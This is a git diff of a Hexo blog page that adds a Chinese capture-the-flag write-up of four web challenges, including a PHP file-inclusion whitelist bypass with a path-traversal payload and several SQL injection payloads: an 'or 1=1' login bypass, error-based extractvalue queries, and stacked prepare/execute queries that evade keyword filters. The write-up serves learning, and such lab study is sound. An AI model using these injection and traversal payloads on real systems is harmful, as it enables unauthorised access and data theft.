@@ -29,9 +29,9 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Lightning" type="application/atom+xml">
-
+<meta name="generator" content="Hexo 5.4.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Lightning" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
@@ -532,7 +532,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-05-18
+                    2021-05-31
                 </div>
                 
 
@@ -556,7 +556,146 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="HCTF-2018-WarmUp-1"><a href="#HCTF-2018-WarmUp-1" class="headerlink" title="[HCTF 2018]WarmUp 1"></a>[HCTF 2018]WarmUp 1</h3><p>首先打开地址，查看网页源代码发现有source.php，之后访问，发现了源码，进行php代码审计</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//代码高亮</span>
+    <span class="token keyword">class</span> <span class="token class-name">emmm</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创立数组，source对应source.php，hint对应hint.php</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//检测变量是否不是字符串或者是否不存在</span>
+                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//传入必须是字符串</span>
+                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//判断page是否再whitelist，也就是上面那两个的白名单</span>
+                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span> <span class="token comment" spellcheck="true">// 函数返回字符串的一部分</span>
+                <span class="token variable">$page</span><span class="token punctuation">,</span>
+                <span class="token number">0</span><span class="token punctuation">,</span>
+                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//查找字符串在别一字符串中首次出现的位置</span>
+            <span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 如果在？之后被阉割后还在白名单中返回true</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//url解码</span>
+            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
+                <span class="token variable">$_page</span><span class="token punctuation">,</span>
+                <span class="token number">0</span><span class="token punctuation">,</span>
+                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//再次阉割一次</span>
+            <span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 如果解码后在？之后被阉割后还在白名单中返回true</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最后，如果file不是空，且file是字符串，且满足上述的函数返回值是true</span>
+        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//最后就是文件上传基本操作</span>
+        exit<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>  
+<span class="token delimiter">?></span>
+</code></pre>
+<p>最后要进行两次解码，所以反推 ？进行两次加密是%253F，所以我们构造payload</p>
+<pre><code>file=hint.php%253F/../../ffffllllaaaagggg
+</code></pre>
+<pre><code>flag{6a1fc929-ae36-44f6-8ed9-9f7e5b663f48} 
+</code></pre>
+<h3 id="极客大挑战-2019-EasySQL-1"><a href="#极客大挑战-2019-EasySQL-1" class="headerlink" title="[极客大挑战 2019]EasySQL 1"></a>[极客大挑战 2019]EasySQL 1</h3><p>一看界面和名字就知道是sql注入的题。</p>
+<p><img src="https://z3.ax1x.com/2021/05/31/2e7Zm6.png"></p>
+<p>上万能密码</p>
+<pre><code>username=admin'or 1=1%23&amp;password=1 //这里%23是#的url编码
+</code></pre>
+<pre><code>flag{492a124e-dd02-4fc8-bb53-ddafff3c0adf} 
+</code></pre>
+<h3 id="极客大挑战-2019-Havefun-1"><a href="#极客大挑战-2019-Havefun-1" class="headerlink" title="[极客大挑战 2019]Havefun 1"></a>[极客大挑战 2019]Havefun 1</h3><p>查看网页源代码</p>
+<pre class=" language-php"><code class="language-php"> <span class="token variable">$cat</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//get方式传参，如果cat参数等于dog，就输出Syc{cat_cat_cat_cat}</span>
+        <span class="token keyword">echo</span> <span class="token variable">$cat</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cat</span><span class="token operator">==</span><span class="token string">'dog'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">'Syc{cat_cat_cat_cat}'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+</code></pre>
+<pre><code>
+flag{44186e9b-b76e-41fb-9c13-9e4271a9ef71} 
+</code></pre>
+<h3 id="强网杯-2019-随便注-1"><a href="#强网杯-2019-随便注-1" class="headerlink" title="[强网杯 2019]随便注 1"></a>[强网杯 2019]随便注 1</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/78989602">详见</a>首先输入单引号，发现报错，说明是’包裹</p>
+<p><img src="https://z3.ax1x.com/2021/05/31/2eXRN6.png"></p>
+<p>1’ order by 3#判断出只有两列</p>
+<p><img src="https://z3.ax1x.com/2021/05/31/2ejFU0.png"></p>
+<p>接下来联合查询，查库，查表，查字段</p>
+<p>尝试原始的联合查询</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token comment" spellcheck="true">--+</span>
+</code></pre>
+<p><img src="https://z3.ax1x.com/2021/05/31/2ev3es.png"></p>
+<p>告诉我们select，update，delete，drop，insert，where，.，这些都被过滤了。之后我们尝试堆叠注入，一次可以查询多个sql语句</p>
+<pre class=" language-sql"><code class="language-sql">用户名
+<span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span>
+error <span class="token number">1105</span> : XPATH syntax error: <span class="token string">'~root@localhost~'</span>
+
+数据库
+
+<span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span>
+error <span class="token number">1105</span> : XPATH syntax error: <span class="token string">'~supersqli~'</span>
+
+版本
+<span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span>
+error <span class="token number">1105</span> : XPATH syntax error: <span class="token string">'~10.3.15-MariaDB~'</span>
+</code></pre>
+<pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">';show databases;
+-1'</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span>
+<span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span><span class="token comment" spellcheck="true">#</span>
+<span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span><span class="token comment" spellcheck="true">#</span>
+</code></pre>
+<p>发现flag是在supersqli库中，1919810931114514表中的flag字段。</p>
+<p>上一步我们可以得知flag存在于supersqli数据库中的1919810931114514表的flag字段。</p>
+<p>接下来要读取此字段内的数据，我们要执行的目标语句是：</p>
+<pre class=" language-text"><code class="language-text">select * from `1919810931114514`;
+</code></pre>
+<p>这里需要绕过select的限制，我们可以使用<strong>预编译</strong>的方式。</p>
+<p>预编译相关语法如下：</p>
+<pre class=" language-text"><code class="language-text">set用于设置变量名和值
+prepare用于预备一个语句，并赋予名称，以后可以引用该语句
+execute执行语句
+deallocate prepare用来释放掉预处理的语句
+</code></pre>
+<p>直接看payload就懂了：</p>
+<pre class=" language-mysql"><code class="language-mysql">-1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#
+
+拆分开来如下
+-1';
+set @sql = CONCAT('se','lect * from `1919810931114514`;');
+prepare stmt from @sql;
+EXECUTE stmt;
+#
+</code></pre>
+<p>结果为：</p>
+<pre class=" language-text"><code class="language-text">strstr($inject, "set") && strstr($inject, "prepare")
+</code></pre>
+<p>这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。</p>
+<pre class=" language-mysql"><code class="language-mysql">-1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#
+
+拆分开来如下：
+-1';
+Set @sql = CONCAT('se','lect * from `1919810931114514`;');
+Prepare stmt from @sql;
+EXECUTE stmt;
+</code></pre>
+<pre><code>flag{841e8963-9e87-4992-ac8e-cfd417705b57}
+</code></pre>
+<pre><code>
+</code></pre>
+
                 
             </div>
             <hr/>
@@ -1321,7 +1460,7 @@
                    type="playlist"
                    id="2166145566"
                    fixed='true'
-                   autoplay='true'
+                   autoplay='false'
                    theme='#42b983'
                    loop='all'
                    order='random'
@@ -1350,7 +1489,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">4.2k</span>&nbsp;字
+                class="white-color">7.9k</span>&nbsp;字
             
             
             
